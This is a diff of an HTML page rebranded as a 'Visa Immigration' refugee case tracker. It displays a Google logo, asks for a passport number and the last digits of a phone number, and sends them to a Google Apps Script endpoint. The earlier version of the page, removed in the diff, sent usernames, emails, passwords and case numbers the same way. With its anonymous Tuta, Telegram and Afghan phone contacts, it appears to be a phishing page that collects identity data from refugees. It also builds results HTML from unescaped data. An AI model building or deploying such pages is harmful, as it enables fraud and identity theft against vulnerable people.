@@ -3,8 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="txt_title">VORG GLOBAL</title>
+    <title id="txt_title">Visa Immigration</title>
     <link rel="stylesheet" href="style.css">
+    <style>
+        /* استایل‌های تکمیلی برای بخش نمایش دشبورد و خطاها */
+        .error-msg { display: none; color: #e74c3c; font-size: 0.85rem; margin-top: 4px; text-align: right; }
+        .dashboard-container { display: none; margin-top: 20px; text-align: right; width: 100%; max-height: 400px; overflow-y: auto; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 0.9rem; }
+        th, td { border: 1px solid #ddd; padding: 10px; text-align: center; }
+        th { background-color: #2c3e50; color: white; }
+        #loading { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1000; background: rgba(255,255,255,0.8); padding: 20px; border-radius: 10px; }
+    </style>
 </head>
 <body>
 
@@ -12,11 +21,11 @@
     <div class="visual-section">
         <div class="header-slider">
            <div class="slide active" style="background-image: url('https://picsum.photos/1200/800?v=1')"></div>
-<div class="slide" style="background-image: url('https://picsum.photos/1200/800?v=2')"></div>
+           <div class="slide" style="background-image: url('https://picsum.photos/1200/800?v=2')"></div>
         </div>
         <div class="overlay-content">
-<img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" class="logo">
-            <h1 class="logo-text">VORG GLOBAL</h1>
+            <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" class="logo">
+            <h1 class="logo-text">Visa Immigration</h1>
             <p>Follow & Manage your Refugee case file</p>
         </div>
     </div>
@@ -31,23 +40,22 @@
             <h2 id="txt_login_header">Login to Account</h2>
             
             <div class="field-group">
-                <input type="text" id="userName" placeholder="User Name">
-                <div id="err_userName" class="error-msg">❌ User not found</div>
+                <input type="text" id="passport" placeholder="Passport Number (شماره پاسپورت)">
+                <div id="err_passport" class="error-msg">❌ Passport not found</div>
             </div>
+            
             <div class="field-group">
-                <input type="email" id="email" placeholder="Email">
-                <div id="err_email" class="error-msg">❌ Email mismatch</div>
-            </div>
-            <div class="field-group">
-                <input type="password" id="password" placeholder="Password">
+                <input type="password" id="password" placeholder="Last 5 digits of Phone (۵ رقم آخر شماره تماس)">
                 <div id="err_password" class="error-msg">❌ Incorrect password</div>
             </div>
-            <div class="field-group">
-                <input type="text" id="caseNumber" placeholder="Case Number">
-                <div id="err_caseNumber" class="error-msg">❌ Invalid case</div>
-            </div>
 
-            <button id="loginBtn">Login to Panel</button>
+            <button id="loginBtn">Search Status</button>
+
+            <!-- بخش نمایش نتایج به صورت دشبورد/جدول داینامیک -->
+            <div id="dashboard" class="dashboard-container">
+                <h3 id="result_title" style="color: #2c3e50; margin-bottom: 10px;">اطلاعات پرونده شما:</h3>
+                <div id="tableWrapper"></div>
+            </div>
         </div>
     </div>
 </div>
@@ -57,22 +65,25 @@
 <footer id="main-footer">
     <div class="footer-sec">
         <h4 id="txt_footer_1_h">Lawyers</h4>
-        <a href="#">Australia</a> <a href="#">UK</a>
+        <a href="https://t.me/visa_immigration_vim" target="_blank">Telegram</a> 
+        <a href="https://tally.so/r/PdgqXe" target="_blank">Contact Form</a>
     </div>
     <div class="footer-sec">
-        <h4 id="txt_footer_2_h">Contracts</h4>
-        <a href="#">New Request</a>
+        <h4 id="txt_footer_2_h">Information</h4>
+        <a href="#">VISA_IMMIGRATION2026</a>
     </div>
     <div class="footer-sec">
         <h4 id="txt_footer_3_h">Contact</h4>
-        <a href="#">WhatsApp</a>
+        <a href="tel:+93780412583">+93 780 412 583</a>
+        <a href="mailto:immigration.tehran@tuta.io">Email Us</a>
     </div>
 </footer>
 
 <script>
+    // لینک وب اپ گوگل اسکریپت شما
     const GOOGLE_API_URL = "https://script.google.com/macros/s/AKfycbyjvuEm6Trv1SokGDrPUQK9dPJoDnzlTVvORxTYB9mgnomGcxdJgLadFSwGaz6EoDesoA/exec";
 
-    // Slider
+    // Slider Logic
     let currentSlide = 0;
     const slides = document.querySelectorAll('.slide');
     setInterval(() => {
@@ -81,38 +92,85 @@
         slides[currentSlide].classList.add('active');
     }, 5000);
 
-    // Multi-lang
+    // Multi-lang Support
     const translations = {
-        en: { dir: "ltr", login_header: "User Login", login_btn: "Login to Panel", empty: "Fill all fields", loading: "Welcome! Redirecting..." },
-        fa: { dir: "rtl", login_header: "ورود کاربری", login_btn: "ورود به پنل", empty: "تمام فیلدها را پر کنید", loading: "خوش آمدید! در حال انتقال..." }
+        en: { 
+            dir: "ltr", 
+            login_header: "Track Your Case", 
+            login_btn: "Search Status", 
+            pass_ph: "Passport Number", 
+            sec_ph: "Last 5 digits of Phone",
+            empty: "Please fill in all fields!" 
+        },
+        fa: { 
+            dir: "rtl", 
+            login_header: "پیگیری پرونده ویزا", 
+            login_btn: "جستجوی وضعیت", 
+            pass_ph: "شماره پاسپورت", 
+            sec_ph: "۵ رقم آخر شماره تماس (رمز)",
+            empty: "لطفاً تمام فیلدها را پر کنید!" 
+        }
     };
 
     function changeLanguage(lang) {
         const t = translations[lang];
         document.documentElement.dir = t.dir;
+        document.documentElement.lang = lang;
         document.getElementById('txt_login_header').innerText = t.login_header;
         document.getElementById('loginBtn').innerText = t.login_btn;
+        document.getElementById('passport').placeholder = t.pass_ph;
+        document.getElementById('password').placeholder = t.sec_ph;
     }
 
+    // دکمه جستجو و اعتبارسنجی
     document.getElementById('loginBtn').addEventListener('click', () => {
-        const user = document.getElementById('userName').value;
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
-        const caseNum = document.getElementById('caseNumber').value;
+        const passport = document.getElementById('passport').value.trim();
+        const password = document.getElementById('password').value.trim();
 
-        if(!user || !email || !pass || !caseNum) return alert("Empty fields!");
+        if(!passport || !password) {
+            alert(document.documentElement.lang === 'fa' ? "لطفاً شماره پاسپورت و رمز را وارد کنید." : "Please enter passport and password.");
+            return;
+        }
 
         document.getElementById('loading').style.display = 'block';
-        fetch(`${GOOGLE_API_URL}?user=${user}&email=${email}&pass=${pass}&case=${caseNum}`)
+        document.getElementById('dashboard').style.display = 'none';
+
+        // ارسال درخواست به گوگل اسکریپت
+        fetch(`${GOOGLE_API_URL}?passport=${encodeURIComponent(passport)}&password=${encodeURIComponent(password)}`)
             .then(res => res.json())
             .then(data => {
                 document.getElementById('loading').style.display = 'none';
-                if(data.success) {
-                    localStorage.setItem('userCaseNumber', caseNum);
-                    window.location.href = "panel.html";
+                
+                if(data.status === 'success' && data.data.length > 0) {
+                    document.getElementById('dashboard').style.display = 'block';
+                    
+                    // ساخت داینامیک جدول بر اساس ستون‌های گوگل شیت
+                    let tableHTML = '<table><tr>';
+                    const headers = Object.keys(data.data[0]);
+                    
+                    headers.forEach(header => {
+                        tableHTML += `<th>${header}</th>`;
+                    });
+                    tableHTML += '</tr>';
+
+                    data.data.forEach(row => {
+                        tableHTML += '<tr>';
+                        headers.forEach(header => {
+                            tableHTML += `<td>${row[header] !== undefined ? row[header] : ''}</td>`;
+                        });
+                        tableHTML += '</tr>';
+                    });
+                    tableHTML += '</table>';
+
+                    document.getElementById('tableWrapper').innerHTML = tableHTML;
                 } else {
-                    alert("Error in credentials");
+                    alert(document.documentElement.lang === 'fa' ? "اطلاعاتی با این مشخصات یافت نشد یا رمز عبور اشتباه است." : "Record not found or incorrect password.");
                 }
+            })
+            .catch(err => {
+                document.getElementById('loading').style.display = 'none';
+                console.error(err);
+                alert("خطا در ارتباط با سرور. لطفاً دوباره تلاش کنید.");
             });
     });
 </script>
